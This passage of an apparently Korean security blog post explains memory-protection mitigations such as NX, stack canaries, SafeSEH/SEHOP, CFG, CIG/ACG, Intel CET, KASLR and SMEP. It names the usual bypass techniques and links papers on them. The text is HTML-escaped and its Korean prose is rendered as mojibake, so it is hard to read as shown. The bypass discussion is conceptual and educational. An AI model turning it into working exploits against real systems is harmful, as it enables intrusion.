56196357c000-561963581000 r-xp 00002000 103:02 2752672                   /usr/bin/cat
561963581000-561963584000 r--p 00007000 103:02 2752672                   /usr/bin/cat
561963584000-561963585000 r--p 00009000 103:02 2752672                   /usr/bin/cat
561963585000-561963586000 rw-p 0000a000 103:02 2752672                   /usr/bin/cat
561964938000-561964959000 rw-p 00000000 00:00 0                          [heap]
7fe9c9dbe000-7fe9c9de0000 rw-p 00000000 00:00 0 
7fe9c9de0000-7fe9ca495000 r--p 00000000 103:02 2753788                   /usr/lib/locale/locale-archive
7fe9ca495000-7fe9ca4ba000 r--p 00000000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca4ba000-7fe9ca632000 r-xp 00025000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca632000-7fe9ca67c000 r--p 0019d000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca67c000-7fe9ca67f000 r--p 001e6000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca67f000-7fe9ca682000 rw-p 001e9000 103:02 2756186                   /usr/lib/x86_64-linux-gnu/libc-2.30.so
7fe9ca682000-7fe9ca688000 rw-p 00000000 00:00 0 
7fe9ca69d000-7fe9ca69e000 r--p 00000000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca69e000-7fe9ca6c0000 r-xp 00001000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca6c0000-7fe9ca6c8000 r--p 00023000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca6c9000-7fe9ca6ca000 r--p 0002b000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca6ca000-7fe9ca6cb000 rw-p 0002c000 103:02 2756182                   /usr/lib/x86_64-linux-gnu/ld-2.30.so
7fe9ca6cb000-7fe9ca6cc000 rw-p 00000000 00:00 0 
7ffe55212000-7ffe55234000 rw-p 00000000 00:00 0                          [stack]
7ffe5539a000-7ffe5539d000 r--p 00000000 00:00 0                          [vvar]
7ffe5539d000-7ffe5539e000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ ê²°ê³¼ë¥¼ ë³´ë©´ ì½”ë“œê°€ ë§¤í•‘ëœ ê³³ ì´ì™¸ì˜ ëª¨ë“  ì˜ì—­ì—ëŠ” executable ê¶Œí•œì´ ì—†ìŠµë‹ˆë‹¤. ë³´í†µ ì‹¤í–‰ë˜ì–´ì•¼ í•˜ëŠ” ì˜ì—­ì—ëŠ” write ê¶Œí•œì´ í•„ìš” ì—†ìœ¼ë¯€ë¡œ ì½”ë“œ ì˜ì—­ì—ëŠ” wì™€ x ê¶Œí•œì´ í•¨ê»˜ ë¶€ì—¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;NXë¥¼ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ëŒ€í‘œì ì¸ ë°©ë²•ì€ ROP(Return Oriented Programming) ì…ë‹ˆë‹¤. ROPëŠ” ì‹¤í–‰ê°€ëŠ¥í•œ ì½”ë“œ ì˜ì—­ì˜ gadget(ëª…ë ¹ì–´ë“¤ì˜ ì§‘í•©)ì„ ì´ìš©í•˜ì—¬ ë‹¤ë¥¸ ë©”ëª¨ë¦¬ ì˜ì—­ì— ì‹¤í–‰ê¶Œí•œì´ ì—†ë”ë¼ë„ ì›í•˜ëŠ” ì‹¤í–‰ íë¦„ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;3-stack-canary--gsbuffer-security-check&quot;&gt;3. Stack Canary / GS(Buffer Security Check)&lt;/h2&gt;

&lt;p&gt;Stack CanaryëŠ” ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë§‰ê¸° ìœ„í•´ ë§Œë“¤ì–´ì§„ ê¸°ë²•ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/d046249f-d887-424c-bb76-5b543c449e5e/3c51ae8b-a2d5-4601-92a4-fcdfaf356162.png&quot; alt=&quot;/assets/d046249f-d887-424c-bb76-5b543c449e5e/3c51ae8b-a2d5-4601-92a4-fcdfaf356162.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë³´í†µ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ì·¨ì•½ì ì´ ë°œìƒí•˜ë©´ ë¦¬í„´ ì£¼ì†Œë¥¼ ë®ì–´ ì‰½ê²Œ í”„ë¡œê·¸ë¨ì˜ ì‹¤í–‰ íë¦„ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Stack CanaryëŠ” í•¨ìˆ˜ê°€ ë¦¬í„´í•˜ê¸° ì „ì— ë¯¸ë¦¬ ì‚½ì…í•´ë‘” canary ê°’ì´ ë³€ì¡°ë˜ì§€ ì•Šì•˜ëŠ”ì§€ ê²€ì‚¬í•´ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ íƒì§€í•©ë‹ˆë‹¤. ì´ ë•Œ canaryê°€ ë³€ì¡°ë˜ì—ˆë‹¤ë©´ í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìê°€ buffer overflow ì·¨ì•½ì  í•˜ë‚˜ë¡œëŠ” ì‹¤í–‰íë¦„ì„ ë°”ê¿€ ìˆ˜ ì—†ê²Œ ë§Œë“­ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ ê¸°ë²•ì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ëŒ€í‘œì ì¸ ë°©ë²•ì€ Info Leak ì…ë‹ˆë‹¤. canaryë„ ê²°êµ­ ë©”ëª¨ë¦¬ì— ì €ì¥ë˜ê¸° ë•Œë¬¸ì— ì´ ê°’ì„ leakí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ìˆë‹¤ë©´ canaryê°€ ë³€ì¡°ë˜ì§€ ì•Šì€ ê²ƒ ì²˜ëŸ¼ ì†ì—¬ ë¦¬í„´ ì£¼ì†Œë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;4-safeseh-sehop&quot;&gt;4. SafeSEH, SEHOP&lt;/h2&gt;

&lt;p&gt;SEHëŠ” â€œStructured Exception Handlingâ€ì˜ ì¤„ì„ë§ë¡œ ìœˆë„ìš°ì—ì„œ ì œê³µí•˜ëŠ” ì˜ˆì™¸ ì²˜ë¦¬ ì‹œìŠ¤í…œì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;__try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;// Exception may occur here&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;__except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EXCEPTION_EXECUTE_HANDLER&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;// This handles the exception&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì˜ˆì‹œ ì½”ë“œëŠ” ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/35e541d9-921c-48e5-86f6-be784e27f5cf/fca1b49d-6b9c-4d2a-b7b7-6a2e21e46de7.png&quot; alt=&quot;/assets/35e541d9-921c-48e5-86f6-be784e27f5cf/fca1b49d-6b9c-4d2a-b7b7-6a2e21e46de7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë˜í•œ SEHëŠ” ë©”ëª¨ë¦¬ì—ì„œ ìœ„ì™€ ê°™ì´ ì²´ì¸ìœ¼ë¡œ ì—°ê²°ë˜ì–´ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ê°’ì´ ìŠ¤íƒì— ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ì™€ ê°™ì€ ì·¨ì•½ì ìœ¼ë¡œ sehë¥¼ ë®ì–´ì„œ ê³µê²©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. sehë¥¼ ë®ê²Œë˜ë©´ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¡œ ì¸í•´ canaryê°€ ë®íˆë”ë¼ë„ canaryë¥¼ ì²´í¬í•˜ê¸° ì „ì— ì£¼ì†Œë¥¼ ì°¸ì¡°í• ë•Œ ì—ëŸ¬ê°€ ë°œìƒí•˜ì—¬ sehë¥¼ í•¸ë“¤ë§í•˜ëŠ” ì½”ë“œë¡œ ë„˜ì–´ê°€ê²Œ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ canaryë¥¼ ë¬´ì‹œí•˜ê³  ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì™€ ê°™ì€ seh overwriteë¥¼ ë§‰ëŠ” ë³´í˜¸ê¸°ë²•ì´ SafeSEH, SEHOPì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;4-1-safeseh&quot;&gt;4-1. SafeSEH&lt;/h3&gt;

&lt;p&gt;SafeSEHëŠ” exceptionì´ ë°œìƒí•˜ê³  exception í•¸ë“¤ëŸ¬ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ì— ì•„ë˜ì™€ ê°™ì€ ê²€ì‚¬ë¥¼ ì§„í–‰í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;exception pointerê°€ ìŠ¤íƒ ì˜ì—­ì¸ì§€ í™•ì¸í•˜ê³  ìŠ¤íƒ ì˜ì—­ì´ë¼ë©´ ì‹¤í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;handler pointerê°€ ë¡œë“œëœ module ì£¼ì†Œ ì˜ì—­ì— ë“±ë¡ëœ handlerì¸ì§€ í™•ì¸í•˜ê³  ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ ì‹¤í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ë”°ë¼ì„œ sehë¥¼ ë®ì–´ handlerë¥¼ ì¡°ì‘í•˜ëŠ”ê²ƒì„ ë§‰ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;4-2-sehop&quot;&gt;4-2. SEHOP&lt;/h3&gt;

&lt;p&gt;SEHOP(Structured Exception Handling Overwrite Protection)ì€ sehì˜ ë§ˆì§€ë§‰ ì²´ì¸ì´ ntdll!_except_handler ì¸ì§€ í™•ì¸í•˜ì—¬ seh overwriteë¥¼ ë§‰ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ìœ„ ë‘ê°€ì§€ ë³´í˜¸ê¸°ë²•ì„ ìš°íšŒí•œ ì˜ˆì‹œëŠ” &lt;a href=&quot;https://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite_CanSecWest2010.pdf&quot;&gt;ì´ ë§í¬&lt;/a&gt;ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;5-cfgcontrol-flow-guard&quot;&gt;5. CFG(Control Flow Guard)&lt;/h2&gt;

&lt;p&gt;CFGëŠ” ì»´íŒŒì¼í•  ë•Œ ë³´ì•ˆ ê²€ì‚¬ ì½”ë“œë¥¼ ì‚½ì…í•˜ì—¬ í•¨ìˆ˜ í¬ì¸í„°ê°€ ì¡´ì¬í•˜ëŠ” ë©”ëª¨ë¦¬ë¥¼ ì¡°ì‘í•˜ì—¬ ê³µê²©í•˜ëŠ”ê²ƒì„ ë§‰ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/e79483c1-c433-43db-b9f3-fb74a30512f4/9c981f46-d00e-401c-a4a6-9b32f2e53f32.png&quot; alt=&quot;/assets/e79483c1-c433-43db-b9f3-fb74a30512f4/9c981f46-d00e-401c-a4a6-9b32f2e53f32.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì˜ˆë¥¼ ë“¤ì–´ ìœ„ì™€ ê°™ì€ ì½”ë“œì—ì„œ Cbì— ëŒ€í•œ ê²€ì¦ì´ ì—†ë‹¤ë©´ ê³µê²©ìì— ì˜í•´ í•¨ìˆ˜ í¬ì¸í„°ê°€ ë³€ê²½ë˜ì–´ ì½”ë“œ ì‹¤í–‰ íë¦„ì´ ë³€ì¡°ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ëª¨ë“  function pointerë¥¼ ì´ìš©í•œ í˜¸ì¶œì— ê²€ì‚¬ë£¨í‹´ì„ ì‚½ì…í•˜ì—¬ ê²€ì¦ëœ pointerë§Œ í˜¸ì¶œí•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ë§Œì•½ CFG ê²€ì‚¬ê°€ ì‹¤íŒ¨í•˜ë©´ í”„ë¡œê·¸ë¨ì€ ë°”ë¡œ ì¢…ë£Œë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;CFGë¥¼ ìš°íšŒí•˜ëŠ” ê¸€ì€ &lt;a href=&quot;https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively-wp.pdf&quot;&gt;ì´ ë§í¬&lt;/a&gt;ë¥¼ ì°¸ì¡°í•˜ì—¬ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;6-cig-code-integrity-guard-acg-arbitrary-code-guard&quot;&gt;6. CIG (Code Integrity Guard), ACG (Arbitrary Code Guard)&lt;/h2&gt;

&lt;h3 id=&quot;6-1-cig&quot;&gt;6-1. CIG&lt;/h3&gt;

&lt;p&gt;CIGëŠ” í”„ë¡œì„¸ìŠ¤ì— ì˜í•´ ì„œëª…ëœ DLLë§Œ ë¡œë“œí•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ë³´í˜¸ê¸°ë²•ì…ë‹ˆë‹¤. ë³´í†µ ìœˆë„ìš°ì—ì„œ  exploit í•  ë•ŒëŠ” ëŒ€ë¶€ë¶„ ê³µê²©ìê°€ ìƒì„±í•œ DLLì„ ë¡œë“œí•˜ê¸° ë•Œë¬¸ì— CIGë¥¼ í†µí•´ ì„œëª…ë˜ì§€ ì•Šì€ DLLì„ ë¡œë“œí•˜ëŠ” ê²ƒì„ ë§‰ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;6-2-acg&quot;&gt;6-2. ACG&lt;/h3&gt;

&lt;p&gt;ACGëŠ” CIGì™€ ê°™ì´ ì‚¬ìš©ë˜ë©° ë™ì ìœ¼ë¡œ ì½”ë“œë¥¼ ìƒì„±í•˜ê±°ë‚˜ ìˆ˜ì •í•˜ì§€ ëª»í•˜ê²Œ í•˜ëŠ” ë³´í˜¸ê¸°ë²• ì…ë‹ˆë‹¤. ë§Œì•½ CIGë§Œ ê±¸ë ¤ìˆì„ ê²½ìš° DLLì„ ë¡œë“œí•˜ì§€ ì•Šê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualProtect&lt;/code&gt;ë‚˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;ì„ ì´ìš©í•´ ì›í•˜ëŠ” ì½”ë“œë¥¼ ë©”ëª¨ë¦¬ì— ì˜¬ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ ACGëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualProtect&lt;/code&gt;ì‹œ ì½”ë“œë¥¼ ìˆ˜ì • ê°€ëŠ¥í•˜ê²Œ í•˜ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; ê¶Œí•œì„ ì´ë¯¸ì§€ ì˜ì—­ì— ì¤„ ìˆ˜ ì—†ê²Œ ë§Œë“¤ê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;ì‹œì—ë„ ìƒˆë¡œìš´ &lt;code class=&quot;highlighter-rouge&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; ê¶Œí•œì„ ê°€ì§„ í˜ì´ì§€ë¥¼ ë§Œë“¤ ìˆ˜ ì—†ê²Œ ë§‰ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ìœ„ ë‘ ê°€ì§€ ë³´í˜¸ê¸°ë²•ì„ ì´ìš©í•´ ìœˆë„ìš°ì—ì„œ ë™ì‘í•˜ëŠ” ì•…ì„±ì½”ë“œê°€ ì½”ë“œ ì¸ì ì…˜ì„ í•  ìˆ˜ ì—†ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;7-cet-control-flow-enforcement-technology-specification&quot;&gt;7. CET (Control-flow Enforcement Technology Specification)&lt;/h2&gt;

&lt;p&gt;ROP(Return-Oriented Programming), JOP(Jmp-Oriented Programming) ê³µê²©ì„ ìˆ˜í–‰í•  ë•Œ, ë³´í†µ íë¦„ì„ ì œì–´í•  ìˆ˜ ìˆëŠ” ëª…ë ¹ì–´(&lt;code class=&quot;highlighter-rouge&quot;&gt;RET&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;CALL&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;JMP&lt;/code&gt;)ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. CETëŠ” ì•„ë˜ì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ROP/JOPí˜•íƒœì˜ íë¦„ì œì–´ë¥¼ ë§‰ëŠ” ë³´í˜¸ê¸°ë²•ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;7-1-shadow-stack&quot;&gt;7-1. Shadow stack&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bc6cb641-2765-46ae-b036-1c3860e25dbe/b9a647ab-4cc0-43d4-8bf3-4f09f75324bd.png&quot; alt=&quot;/assets/bc6cb641-2765-46ae-b036-1c3860e25dbe/b9a647ab-4cc0-43d4-8bf3-4f09f75324bd.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìŠ¤íƒì— ROP/JOP í˜ì´ë¡œë“œë¥¼ ì“°ëŠ” ê²ƒì„ ë³´í˜¸í•˜ëŠ” ê¸°ë²•ìœ¼ë¡œ CALLë¡œ ë‹¤ë¥¸ í•¨ìˆ˜ í˜¸ì¶œ ì‹œ í˜„ì¬ ìŠ¤íƒê³¼ Shadow Stackì— ë¦¬í„´ ì£¼ì†Œë¥¼ í‘¸ì‹œí•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  í•¨ìˆ˜ì—ì„œ íƒˆì¶œí•  ë•Œ RET ëª…ë ¹ì–´ëŠ” ë‘ ìŠ¤íƒì— ìˆëŠ” ë¦¬í„´ì£¼ì†Œë¥¼ íŒí•˜ì—¬ ë¹„êµí•©ë‹ˆë‹¤. ë§Œì•½ ë¦¬í„´ ì£¼ì†Œê°€ ë³€ì¡°ë˜ì—ˆë‹¤ë©´ ë¹„ì •ìƒì ì¸ í–‰ë™ì´ë¯€ë¡œ í”„ë¡œê·¸ë¨ì„ ì¢…ë£Œí•©ë‹ˆë‹¤. ì´ê²ƒì„ í†µí•´ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ì™€ ê°™ì€ ì·¨ì•½ì ìœ¼ë¡œ RETë¥¼ ì¡°ì‘í•˜ì—¬ exploití•˜ëŠ” ê²ƒì„ ë§‰ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ ë³´í˜¸ê¸°ë²•ì„ ìœ„í•´ ìœˆë„ìš°ì—ì„œëŠ” ì•„ë˜ì™€ ê°™ì€ ìƒˆë¡œìš´ ëª…ë ¹ì–´ë“¤ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;INCSSP : shadow stack pointerë¥¼ ì¦ê°€ì‹œí‚µë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;RDSSP : shadow stack pointerë¥¼ ì½ìŠµë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;SAVEPREVSSP, RSTORSSP : ì´ì „ shadow stack pointerë¥¼ ì €ì¥í•˜ê±°ë‚˜ ê°€ì ¸ì˜µë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;WRSS, WRUSS : shadow stackì— ê°’ì„ ì”ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;SETSSBSY, CLRSSBSY : shadow stackì´ busy ìƒíƒœì¸ì§€ clear ìƒíƒœì¸ì§€ flagë¥¼ ë§ˆí‚¹í•©ë‹ˆë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Shadow stackì„ ìš°íšŒí•˜ëŠ” ê¸°ë²•ì€ &lt;a href=&quot;https://eyalitkin.wordpress.com/2017/08/18/bypassing-return-flow-guard-rfg/&quot;&gt;ì´ ë§í¬&lt;/a&gt;ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;7-2-indirect-branch-tracking&quot;&gt;7-2. Indirect branch tracking&lt;/h3&gt;

&lt;p&gt;JMP/CALL ì´í›„ ë¹„ì •ìƒì ì¸ í–‰ë™ì„ ê²€ì‚¬í•˜ëŠ” ë³´í˜¸ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ë³´í˜¸ê¸°ë²•ì—ì„œëŠ” ENDBR32/ENDBR64(ENDBRANCH)ë¼ëŠ” ìƒˆë¡œìš´ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì–´ëŠ” CETë¥¼ ì§€ì›í•˜ì§€ ì•ŠëŠ” í”„ë¡œì„¸ì„œì—ì„œëŠ” NOPìœ¼ë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/1c0acdc4-169f-446e-bb6b-aa8533c5df4f/ea9f6673-d603-43f3-a8e7-88a0fcff9e95.png&quot; alt=&quot;/assets/1c0acdc4-169f-446e-bb6b-aa8533c5df4f/ea9f6673-d603-43f3-a8e7-88a0fcff9e95.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CETê°€ í™œì„±í™”ë˜ë©´ ê° í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì— ENDBR32/ENDBR64 ëª…ë ¹ì–´ë¥¼ ì‚½ì…í•˜ê³  JMPì™€ CALLì´í›„ì— ENDBR32/ENDBR64 ëª…ë ¹ì–´ê°€ ë‚˜ì˜¤ì§€ ì•ŠëŠ”ë‹¤ë©´ control protection ì˜ˆì™¸(#CP)ê°€ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/b1a9bbbc-bbd0-4a7d-ad49-ba2ff90f2ea8/19bd816e-76ee-44ad-8c6c-5d8b1abc3f41.png&quot; alt=&quot;/assets/b1a9bbbc-bbd0-4a7d-ad49-ba2ff90f2ea8/19bd816e-76ee-44ad-8c6c-5d8b1abc3f41.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì´ê²ƒì„ í†µí•´ ROPë‚˜ JOPì—ì„œ code gadgetì„ ì‚¬ìš©í•˜ì§€ ëª»í•˜ê²Œ í•´ì„œ exploitì„ ë§‰ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë§Œ ëª¨ë“  callì´ë‚˜ jmpì—ì„œ ì ìš©ë˜ëŠ” ë‚´ìš©ì€ ì•„ë‹ˆê³  ëª‡ ê°€ì§€ ì˜ˆì™¸ëŠ” ì¡´ì¬í•©ë‹ˆë‹¤. (e.g. far direct jmp (&lt;code class=&quot;highlighter-rouge&quot;&gt;JMP DS:[mylabel], rip&lt;/code&gt;)ì— ì˜ì¡´ì ì¸ jmp, jcc (jump if condition is met) ëª…ë ¹ì–´)&lt;/p&gt;

&lt;p&gt;ìœ„ ë‘ê°€ì§€ ë³´í˜¸ê¸°ë²•ì„ ì´ìš©í•´ ì‹¤í–‰íë¦„ì„ ë³€ê²½í•  ìˆ˜ ìˆëŠ” ëª…ë ¹ì–´ë“¤ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ ì§„í–‰í•˜ì—¬ exploitì„ ì–´ë µê²Œ ë§Œë“­ë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;8-kaslr--smep--smap&quot;&gt;8. KASLR / SMEP / SMAP&lt;/h2&gt;

&lt;h3 id=&quot;8-1-kaslr-kernel-address-space-layout-randomization&quot;&gt;8-1. KASLR (Kernel Address Space Layout Randomization)&lt;/h3&gt;

&lt;p&gt;KASLRì´ë€ ì»¤ë„ ì½”ë“œ ì˜ì—­ì„ ëœë¤í•˜ê²Œ í• ë‹¹í•˜ì—¬ ì»¤ë„ exploitì„ ì–´ë µê²Œ ë§Œë“œëŠ” ê¸°ë²•ì…ë‹ˆë‹¤. ëŒ€ìƒì´ ì»¤ë„ ì½”ë“œë¼ëŠ” ì ë§Œ ì œì™¸í•˜ë©´ ë™ì‘ ê³¼ì •ê³¼ ìš°íšŒ ê¸°ë²•ì€ &lt;a href=&quot;https://www.notion.so/youngjoo/ec6ae02f7821473cafb018acdd203f91#73a693962691483db33d12abd37dd01e&quot;&gt;ASLR&lt;/a&gt;ê³¼ ë™ì¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;8-2-smep-supervisor-mode-execution-prevention&quot;&gt;8-2. SMEP (Supervisor Mode Execution Prevention)&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/31b27184-f7e0-4ed0-b672-2b34db8c2e37/f3df27c9-deec-488f-a24f-5ea32641e54d.png&quot; alt=&quot;/assets/31b27184-f7e0-4ed0-b672-2b34db8c2e37/f3df27c9-deec-488f-a24f-5ea32641e54d.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Privilege ring(Protection ring)ì€ ì‹œìŠ¤í…œì„ ë³´í˜¸í•˜ê¸° ìœ„í•´ ìì›ì˜ ì ‘ê·¼ì— ë‹¤ë¥¸ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. í˜„ëŒ€ì˜ OSì—ì„œëŠ” privilege ringì˜ 4ê°€ì§€ ê¶Œí•œ ì¤‘ ring 0ì™€ ring 3ë§Œ ì‚¬ìš©í•˜ë©°, ring 0 ê¶Œí•œìœ¼ë¡œ ì»¤ë„ ì½”ë“œê°€ ì‹¤í–‰ë˜ê³  ring 3 ê¶Œí•œì—ì„  ì‘ìš©í”„ë¡œê·¸ë¨ë“¤ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;SMEPëŠ” supervisor mode (ring0)ì—ì„œ íŠ¹ì • ì£¼ì†Œì— ìˆëŠ” ëª…ë ¹ì–´ë¥¼ fetch í• ë•Œ ê·¸ ì£¼ì†Œê°€ ë§Œì•½ user mode (ring3)ì—ì„œ ì ‘ê·¼ê°€ëŠ¥í•œ ì£¼ì†Œë¼ë©´ fetchí•˜ì§€ ì•Šê²Œ í•˜ëŠ” ë³´í˜¸ê¸°ë²•ì…ë‹ˆë‹¤. ë”°ë¼ì„œ supervisor modeì¼ë•Œ ìœ ì € ì˜ì—­ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.&lt;/p&gt;

